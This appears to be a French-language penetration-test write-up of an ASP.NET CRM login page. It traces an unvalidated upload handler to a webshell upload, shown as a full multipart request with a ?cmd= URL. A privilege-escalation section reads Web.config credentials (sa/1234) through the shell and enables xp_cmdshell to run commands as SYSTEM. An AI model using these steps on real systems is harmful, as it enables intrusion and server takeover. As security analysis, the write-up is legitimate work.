# Analyse détaillée : Comment j'ai trouvé la vulnérabilité depuis le code source

## Étape 1: Analyse du HTML de la page de login

### 1.1 Observation du formulaire d'inscription

En ouvrant la page de login, j'ai inspecté le code HTML. J'ai remarqué trois sections principales :

```html
<main class="screen-login">...</main>           <!-- Login normal -->
<main class="screen-reinitialiser">...</main>   <!-- Reset password -->
<main class="screen-inscription oe_hidden">...</main>  <!-- Inscription cachée -->
```

**Indice 1 :** Une section `screen-inscription` avec la classe `oe_hidden` signifie qu'elle est masquée, mais présente dans le code.

### 1.2 Analyse du formulaire d'inscription

Dans cette section, j'ai vu :

```html
<div class="avatar-upload">
  <div class="avatar-edit">
    <input type='file' id="imageUpload" accept=".png, .jpg, .jpeg" />
    <label for="imageUpload"></label>
  </div>
</div>

<input type="text" placeholder="Nom&Prénom" class="form-control Nom_Prenom" />
<input type="text" placeholder="User" class="form-control User"/>
<input type="text" placeholder="Code Unique" class="form-control Code_Unique" />
<input type="password" class="form-control Password"/>

<button type="submit" class="btn btn-primary" onclick="return false">inscription</button>
```

**Indice 2 :** `onclick="return false"` signifie que le formulaire n'est pas soumis normalement → la soumission est gérée par JavaScript.

**Indice 3 :** Les champs n'ont pas d'attribut `name`, seulement des `class` → les données sont collectées via JavaScript.

---

## Étape 2: Téléchargement des fichiers JavaScript

J'ai vu que plusieurs scripts sont chargés :

```html
<script src="js/jquery-2.1.1.min.js"></script>
<script src="js/custom.js"></script>
<script src="js/login/core.js"></script>
<script src="js/login/custom.js"></script>
```

J'ai téléchargé ces fichiers pour les analyser :

```bash
curl -s "http://[ip-addr]/js/login/core.js" > login_core.js
curl -s "http://[ip-addr]/js/login/custom.js" > login_custom.js
curl -s "http://[ip-addr]/js/custom.js" > custom.js
```

---

## Étape 3: Analyse de `login_core.js`

### 3.1 Recherche de la fonction d'inscription

J'ai cherché les mots-clés "inscription", "register", "upload". J'ai trouvé :

```javascript
$btninscription.on('click', this, function () {
    var Nom_Prenom = $screen_inscription.find('.oe_login_form .Nom_Prenom').val();
    var User = $screen_inscription.find('.oe_login_form .User').val();
    var Adresse = $screen_inscription.find('.oe_login_form .Adresse').val();
    var Tele = $screen_inscription.find('.oe_login_form .Tele').val();
    var Password = $screen_inscription.find('.oe_login_form .Password').val();
    var Code_Unique = $screen_inscription.find('.oe_login_form .Code_Unique').val();
    inscription(Nom_Prenom, User, Adresse, Tele, Password, Code_Unique, usr_photo);
});
```

**Découverte :** La fonction `inscription()` est appelée avec tous les champs.

### 3.2 Analyse de la fonction `inscription()`

```javascript
function inscription(Nom_Prenom, User, Adresse, Tele, Password, Code_Unique, usr_photo) {
    // Vérifie si une image a été sélectionnée
    if ($('#imagePreview').hasClass('changed')) {
        formdata = new FormData();
        if ($('#imageUpload').prop('files').length > 0) {
            file = $('#imageUpload').prop('files')[0];
            formdata.append("image", file);                    // ← Le fichier
            formdata.append("path", 'image\\data\\login\\');   // ← Le chemin
            var fileName = "Image_" + $.escapeRegExp(User) + "_" + Date.now();
            formdata.append("fileName", fileName);             // ← Le nom du fichier
        }
        
        // Envoi AJAX vers AjaxFileUploader.ashx
        $.ajax({
            type: 'POST',
            url: 'AjaxFileUploader.ashx',      // ← Point d'upload
            async: false,
            data: formdata,
            processData: false,                // ← Ne pas traiter les données
            contentType: false,                // ← Pas de contentType défini
            success: function(data) {
                usr_photo = data;              // ← Retourne le nom du fichier uploadé
            }
        });
    }
}
```

**Points critiques identifiés :**

1. **Le chemin est contrôlé** : `'image\\data\\login\\'` est fixe → pas de path traversal possible ici
2. **Le nom du fichier est construit avec `User`** : `"Image_" + $.escapeRegExp(User) + "_" + Date.now()`
3. **La fonction `$.escapeRegExp`** ne protège que contre les expressions régulières, pas contre les injections
4. **Aucune validation de l'extension** : le fichier garde son extension originale

---

## Étape 4: Analyse de `custom.js` pour trouver `escapeRegExp`

Dans `custom.js`, j'ai trouvé :

```javascript
$.escapeRegExp = function(string) {
    return string.replace(/[^a-zA-Z ]/g, "").replace(/\s/g, ''); 
}
```

**Analyse :** Cette fonction supprime tout ce qui n'est pas une lettre ou un espace. Donc `User` est nettoyé, mais cela ne protège pas le serveur.

---

## Étape 5: Recherche du handler d'upload

L'URL `AjaxFileUploader.ashx` m'a interpellé. J'ai cherché ce fichier dans la liste des fichiers du serveur.

J'ai listé le répertoire de l'application :

```bash
dir C:\inetpub\wwwroot\LEADER~1
```

Et j'ai trouvé :

```
10/10/2019  18:55             1ÿ789 AjaxFileUploader.ashx
```

---

## Étape 6: Analyse du code serveur `AjaxFileUploader.ashx`

J'ai lu le contenu de ce fichier :

```csharp
public void ProcessRequest (HttpContext context) {
    if (context.Request.Files.Count > 0)
    {
        var file = context.Request.Files[0];
        string pathstring = context.Request.Form[0];      // ← PATH contrôlé
        string fileNameString = context.Request.Form[1];  // ← FILENAME contrôlé
        string path = context.Server.MapPath(pathstring);
        
        if (!Directory.Exists(path))
            Directory.CreateDirectory(path);
        
        // Construction du nom de fichier
        FileInfo fInfo = new FileInfo(file.FileName);
        fileNameString = string.Format("{0}{1}", fileNameString, fInfo.Extension);
        string strFileName = fileNameString;
        fileName = Path.Combine(path, fileNameString);
        
        // Sauvegarde sans aucune validation
        file.SaveAs(fileName);    // ← VULNÉRABILITÉ CRITIQUE
    }
}
```

## Étape 7: Identification des vulnérabilités

### Vulnérabilité 1: Path Traversal
```csharp
string pathstring = context.Request.Form[0];
string path = context.Server.MapPath(pathstring);
```
→ Le chemin est directement contrôlé par l'utilisateur. On peut utiliser `..\` pour sortir du dossier.

### Vulnérabilité 2: Upload de fichiers arbitraires
```csharp
file.SaveAs(fileName);
```
→ Aucune validation de l'extension ou du type MIME. On peut uploader des fichiers `.aspx` (webshell).

### Vulnérabilité 3: Contrôle du nom de fichier
```csharp
string fileNameString = context.Request.Form[1];
fileNameString = string.Format("{0}{1}", fileNameString, fInfo.Extension);
```
→ On peut choisir le nom du fichier. On peut injecter des caractères dangereux.

---

## Étape 8: Synthèse de la vulnérabilité

### Chaîne d'attaque :

1. **Client** : L'utilisateur sélectionne un fichier
2. **JavaScript** : 
   - Récupère le fichier
   - Crée un FormData avec `image`, `path`, `fileName`
   - Envoie en POST vers `AjaxFileUploader.ashx`
3. **Serveur** :
   - Reçoit le fichier
   - Prend `path` et `fileName` des paramètres
   - Sauvegarde le fichier sans validation

### Pourquoi c'est vulnérable ?

| Problème | Impact |
|----------|--------|
| Pas de validation d'extension | Upload de .aspx, .ashx, .asmx |
| Path contrôlé | Path traversal possible |
| Nom de fichier contrôlé | Injection possible |
| Pas de vérification MIME | Fichiers malveillants non détectés |

---

## Étape 9: Exploitation déduite

### Payload JavaScript (côté client) :
```javascript
formdata.append("image", webshell);           // webshell.aspx
formdata.append("path", "image\\data\\login\\");
formdata.append("fileName", "shell");
```

### Requête HTTP générée :
```
POST /AjaxFileUploader.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="image"; filename="shell.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %>...
--boundary
Content-Disposition: form-data; name="path"

image\data\login\
--boundary
Content-Disposition: form-data; name="fileName"

shell
--boundary--
```

### Résultat :
Le fichier est sauvegardé dans `C:\inetpub\wwwroot\LEADER CRM\image\data\login\shell.aspx`

### Accès au webshell :
```
http://[ip-addr]/image/data/login/shell.aspx?cmd=whoami
```

---

## Conclusion : Comment j'ai trouvé

1. **Inspection HTML** → découverte du formulaire d'inscription avec upload
2. **Analyse JavaScript** → trouvé la fonction `inscription()` qui envoie vers `AjaxFileUploader.ashx`
3. **Lecture du handler** → identifié l'absence totale de validation
4. **Construction de l'exploit** → upload d'un webshell ASP.NET

La vulnérabilité vient du fait que **le développeur a supposé que la validation côté client (JavaScript) suffisait**, sans implémenter de validation côté serveur.    

### Privilege escalation : 

## Phase: Découverte des identifiants SQL Server

### Lecture du fichier Web.config

Après avoir obtenu un premier shell, j'ai exploré le répertoire de l'application et trouvé le fichier de configuration `Web.config` :

```
http://[ip-addr]/upload/cmd.aspx.aspx?cmd=type C:\inetpub\wwwroot\LEADER~1\Web.config
```

**Contenu du fichier :**

```xml
<?xml version="1.0"?>
<configuration>
  <connectionStrings>
    <add name="TopMSConnectionString" 
         connectionString="Data Source=.\sqlexpress;
                           Initial Catalog=noir_2026;
                           User ID=sa;
                           Password=1234" 
         providerName="System.Data.SqlClient"/>
  </connectionStrings>
  <system.web>
    <compilation debug="true" targetFramework="4.5"/>
  </system.web>
</configuration>
```

### Analyse des informations

| Information | Valeur | Importance |
|-------------|--------|------------|
| Serveur SQL | `.\sqlexpress` | Instance locale de SQL Server Express |
| Base de données | `noir_2026` | Base de données principale de l'application |
| Utilisateur SQL | **sa** | **Compte administrateur SQL (sysadmin)** |
| Mot de passe | **1234** | Mot de passe extrêmement faible |

### Identification de la vulnérabilité

La présence des identifiants **sa** avec un mot de passe trivial en clair dans un fichier accessible constitue une faille critique. Cela permet à un attaquant de se connecter au SQL Server avec des privilèges d'administrateur.

### Connexion au SQL Server

J'ai testé la connexion avec les identifiants découverts :

```bash
sqlcmd -S .\sqlexpress -U sa -P 1234 -Q "SELECT @@VERSION"
```

**Résultat :** Connexion réussie. Le service SQL Server tourne avec les privilèges **SYSTEM**.

### Activation de xp_cmdshell

`xp_cmdshell` est une procédure stockée étendue qui permet d'exécuter des commandes système directement depuis SQL Server. Elle était désactivée par défaut, mais en tant que `sa`, je peux l'activer :

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Résultat :**
```
L'option de configuration 'show advanced options' est passée de 0 à 1.
L'option de configuration 'xp_cmdshell' est passée de 0 à 1.
```

### Exécution de commandes SYSTEM

Avec `xp_cmdshell` activée, toute commande exécutée s'exécute avec les privilèges du service SQL Server, c'est-à-dire **SYSTEM** :

```sql
xp_cmdshell 'whoami'
```

**Résultat :**
```
autorite nt\système
```

**Élévation réussie !** Je suis passé de **NETWORK SERVICE** à **SYSTEM**.
